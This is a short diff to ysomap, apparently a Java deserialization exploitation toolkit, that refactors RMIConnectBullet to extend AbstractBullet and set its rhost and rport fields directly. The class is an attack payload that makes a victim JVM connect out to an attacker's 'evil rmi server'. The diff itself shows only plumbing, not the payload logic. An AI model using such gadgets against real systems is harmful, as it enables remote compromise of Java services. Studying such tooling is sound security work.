@@ -3,9 +3,8 @@ package ysomap.bullets.jdk.rmi;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.tcp.TCPEndpoint;
-import ysomap.bullets.Bullet;
+import ysomap.bullets.AbstractBullet;
 import ysomap.common.annotation.*;
-import ysomap.core.util.ReflectionHelper;
 
 import java.rmi.server.ObjID;
 import java.util.Random;
@@ -19,7 +18,7 @@ import java.util.Random;
 @Details("向外部发起RMI连接")
 @Targets({Targets.JDK})
 @Authors({Authors.WH1T3P1G})
-public class RMIConnectBullet implements Bullet<Object> {
+public class RMIConnectBullet extends AbstractBullet<Object> {
 
     @NotNull
     @Require(name = "rhost", detail = "Remote RMI Server Host to Connect, plz running a evil rmi server")
@@ -38,8 +37,8 @@ public class RMIConnectBullet implements Bullet<Object> {
 
     public static RMIConnectBullet newInstance(Object... args) throws Exception {
         RMIConnectBullet bullet = new RMIConnectBullet();
-        ReflectionHelper.set(bullet, "rhost", args[0]);
-        ReflectionHelper.set(bullet, "rport", args[1]);
+        bullet.set("rhost", args[0]);
+        bullet.set("rport", args[1]);
         return bullet;
     }
 }
